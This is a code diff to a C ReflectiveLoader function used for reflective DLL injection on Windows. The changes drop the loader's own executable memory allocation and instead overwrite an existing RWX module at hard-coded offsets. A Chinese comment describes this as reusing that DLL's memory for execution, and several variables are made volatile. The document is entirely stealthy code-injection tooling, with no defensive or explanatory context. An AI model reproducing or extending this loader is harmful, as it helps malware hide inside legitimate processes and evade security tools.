@@ -50,14 +50,14 @@ __declspec(noinline) ULONG_PTR caller( VOID ) { return (ULONG_PTR)_ReturnAddress
 #define  REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN 0
 
 #ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
-DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( LPVOID lpParameter )
+DLLEXPORT volatile ULONG_PTR WINAPI ReflectiveLoader( LPVOID lpParameter )
 #else
 DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )
 #endif
 {
 	// the functions we need
 	HMODULE hkernel32 = NULL;
-	LOADLIBRARYEXA pLoadLibraryExA = NULL;
+	volatile LOADLIBRARYEXA pLoadLibraryExA = NULL;
 	GETLASTERROR pGetLastError = NULL;
 	OUTPUTDEBUGSTRINGA pOutPutDebugStringA = NULL;
 	VIRTUALPROTECT pVirtualProtectA = NULL;
@@ -71,7 +71,7 @@ DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )
 	// the initial location of this image in memory
 	ULONG_PTR uiLibraryAddress;
 	// the kernels base address and later this images newly loaded base address
-	ULONG_PTR uiBaseAddress;
+	volatile ULONG_PTR uiBaseAddress;
 
 	// variables for processing the kernels export table
 	ULONG_PTR uiAddressArray;
@@ -297,19 +297,19 @@ DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )
 	if (uiBaseAddress == NULL)
 	{
 		
-		//pOutPutDebugStringA();
+	//	pOutPutDebugStringA(dllpath);
 		
 		return 0;
 	}
-	uiBaseAddress = (ULONG_PTR)pVirtualAlloc( NULL, ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
+	//uiBaseAddress = (ULONG_PTR)pVirtualAlloc( NULL, ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
 	//这里是利用RXWDLL的内存进行覆盖执行
 	
 	//uiBaseAddress = uiBaseAddress + 0x36000 + 0x35000;
-	//uiBaseAddress = uiBaseAddress + 0x1000;
+	uiBaseAddress = uiBaseAddress + 0x1000 + 0xd1000;
 	if (pVirtualProtectA == NULL)
 		return 0;
 	DWORD old_protect = 0;
-	pVirtualProtectA((LPVOID)uiBaseAddress, 0x400000, PAGE_EXECUTE_READWRITE,&old_protect);
+//	pVirtualProtectA((LPVOID)uiBaseAddress, 0x400000, PAGE_EXECUTE_READWRITE,&old_protect);
 	// we must now copy over the headers
 	uiValueA = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfHeaders;
 	uiValueB = uiLibraryAddress;
